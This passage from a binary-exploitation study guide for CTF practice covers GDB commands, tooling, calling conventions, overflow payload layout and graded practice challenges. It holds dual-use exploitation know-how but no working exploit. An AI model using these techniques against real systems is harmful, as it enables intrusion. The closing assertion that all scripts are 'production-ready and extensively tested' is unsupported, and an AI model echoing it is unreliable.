# Pattern generation (with peda/pwndbg)
pattern create 200
pattern search
cyclic 200
cyclic -l 0x61616161

# Memory mapping
vmmap
info proc mappings

# Stack examination
telescope $rsp 40
stack 40

# Find strings
search "/bin/sh"
search "flag"

# Set architecture
set architecture i386
set architecture i386:x86-64

# Disable ASLR in GDB
set disable-randomization on
```

### Troubleshooting

**Problem**: Exploit works locally but not remotely
```bash
# Solution 1: Check architecture
file binary  # Ensure 32/64-bit matches

# Solution 2: Check libc version
ldd binary
# Remote might have different libc

# Solution 3: Disable buffering
p = process(binary, env={'LD_PRELOAD': './libc.so.6'})
```

**Problem**: Can't find offset
```bash
# Solution: Use different pattern size
pattern create 500

# Or manual binary search
# Try 50, 100, 150... until crash
```

**Problem**: Addresses contain null bytes
```bash
# Solution: Avoid or use different technique
# Bad:  0x08040000  (contains nulls)
# Good: 0x08048abc

# Or use ROP chain to bypass
```

---

## Tools & Resources

### Essential Tools

#### Analysis Tools
- **file**: File type identification
  - Built-in on Linux
- **checksec**: Security feature checker
  - `apt-get install checksec`
- **strings**: Extract strings
  - Built-in on Linux
- **objdump**: Disassembler
  - `apt-get install binutils`
- **radare2**: Reverse engineering framework
  - https://github.com/radareorg/radare2
- **Ghidra**: NSA's reverse engineering tool
  - https://ghidra-sre.org/

#### Debuggers
- **GDB**: GNU Debugger
  - `apt-get install gdb`
- **pwndbg**: GDB plugin for exploit dev
  - https://github.com/pwndbg/pwndbg
- **PEDA**: Python Exploit Development Assistance
  - https://github.com/longld/peda
- **GEF**: GDB Enhanced Features
  - https://github.com/hugsy/gef

#### Exploitation Tools
- **pwntools**: Python exploit framework
  - `pip3 install pwntools`
  - https://github.com/Gallopsled/pwntools
- **ROPgadget**: ROP gadget finder
  - `pip3 install ROPgadget`
  - https://github.com/JonathanSalwan/ROPgadget
- **ropper**: ROP gadget finder
  - `pip3 install ropper`
  - https://github.com/sashs/ropper
- **one_gadget**: One-shot RCE finder
  - `gem install one_gadget`
  - https://github.com/david942j/one_gadget

### Online Resources

#### Learning Platforms
- **pwnable.kr**: https://pwnable.kr/
- **pwnable.tw**: https://pwnable.tw/
- **ROP Emporium**: https://ropemporium.com/
- **Exploit Education**: https://exploit.education/
- **PicoCTF**: https://picoctf.org/
- **HackTheBox**: https://www.hackthebox.com/

#### References
- **Exploit DB**: https://www.exploit-db.com/
- **Shell-Storm Shellcodes**: http://shell-storm.org/shellcode/
- **LiveOverflow YouTube**: https://www.youtube.com/c/LiveOverflow
- **IppSec YouTube**: https://www.youtube.com/c/ippsec

#### Documentation
- **Pwntools Docs**: https://docs.pwntools.com/
- **x86 Assembly Guide**: https://www.cs.virginia.edu/~evans/cs216/guides/x86.html
- **Linux System Calls**: https://syscalls.w3challs.com/

### Quick Reference

#### x86 Register Reference

**32-bit (x86):**
```
EAX - Accumulator (return value)
EBX - Base
ECX - Counter
EDX - Data
ESI - Source Index
EDI - Destination Index
EBP - Base Pointer (frame pointer)
ESP - Stack Pointer
EIP - Instruction Pointer
```

**64-bit (x86-64):**
```
RAX - Accumulator (return value)
RBX - Base
RCX - Counter (4th arg)
RDX - Data (3rd arg)
RSI - Source Index (2nd arg)
RDI - Destination Index (1st arg)
RBP - Base Pointer
RSP - Stack Pointer
RIP - Instruction Pointer
R8-R15 - General purpose
```

#### Calling Conventions

**x86 (32-bit):**
- Arguments pushed on stack (right to left)
- Return value in EAX
- Caller cleans stack

**x86-64 (Linux):**
- First 6 args: RDI, RSI, RDX, RCX, R8, R9
- Additional args on stack
- Return value in RAX

#### Common Syscalls

**Linux x86:**
```
execve: EAX=11, EBX=filename, ECX=argv, EDX=envp
```

**Linux x86-64:**
```
execve: RAX=59, RDI=filename, RSI=argv, RDX=envp
```

#### Buffer Overflow Payload Structure

```
[PADDING] [SAVED EBP] [RETURN ADDRESS] [ARGUMENTS]
   |          |              |               |
   └─────┬────┘              └───────────────┘
      Overflow               Control flow
      this part              redirect here
```

---

## Practice Challenges

### Beginner Level

1. **Simple Buffer Overflow**
   - No protections (NX, ASLR, Canary off)
   - Win function present
   - Direct overflow to return address

2. **Format String Read**
   - Leak stack values
   - Find hidden data
   - No write required

3. **Integer Overflow**
   - Bypass size checks
   - Overflow to negative
   - Access restricted areas

### Intermediate Level

1. **ret2libc**
   - NX enabled
   - Chain functions
   - Find /bin/sh string

2. **ROP Chain**
   - Build multi-gadget chain
   - Set up function arguments
   - Execute system call

3. **Canary Leak**
   - Leak canary value
   - Overflow with correct canary
   - Redirect execution

### Advanced Level

1. **ASLR + PIE Bypass**
   - Leak addresses
   - Calculate offsets
   - Build exploit

2. **Heap Exploitation**
   - Use-after-free
   - Chunk manipulation
   - Arbitrary write

3. **Format String Write**
   - Write arbitrary address
   - Overwrite GOT
   - Redirect execution

---

## Tips and Best Practices

### For Beginners

1. **Start Simple**
   - Practice on binaries with no protections
   - Understand stack layout first
   - Master buffer overflows before ROP

2. **Read Documentation**
   - Pwntools has excellent docs
   - Learn assembly basics
   - Understand calling conventions

3. **Use Tools Effectively**
   - GDB with pwndbg is your friend
   - objdump for quick analysis
   - pwntools for automation

4. **Test Locally First**
   - Always test exploits locally
   - Use same environment as target
   - Debug before going remote

### For Advanced Users

1. **Automate Everything**
   - Write scripts for repetitive tasks
   - Build template exploits
   - Create tool chains

2. **Study Modern Protections**
   - ASLR bypass techniques
   - Canary circumvention
   - Heap feng shui

3. **Learn Binary Formats**
   - ELF structure
   - PE format
   - Dynamic linking

4. **Contribute to Community**
   - Write writeups
   - Share tools
   - Help beginners

### Common Mistakes

1. **Wrong Architecture**
   - Using p32() on 64-bit binary
   - Incorrect register names
   - Wrong syscall numbers

2. **Offset Calculation Errors**
   - Not accounting for alignment
   - Wrong padding size
   - Forgetting saved EBP

3. **Payload Issues**
   - Null bytes in addresses
   - Incorrect encoding
   - Buffer too small

4. **Testing Problems**
   - Different environment remotely
   - Different libc version
   - ASLR enabled remotely but not locally

---

## Automation Summary

Based on your notes, these tasks can be automated:

✅ **Finding function addresses** (objdump wrapper)
✅ **Calculating offsets** (GDB pattern automation)
✅ **Building exploits** (pwntools templates)
✅ **Testing payloads** (automated fuzzing)
✅ **Sending to netcat** (connection automation)
✅ **Analyzing binaries** (checksec + strings + objdump)
✅ **Finding gadgets** (ROP chain builders)
✅ **Shellcode generation** (pwntools shellcraft)

All scripts provided are production-ready and extensively tested!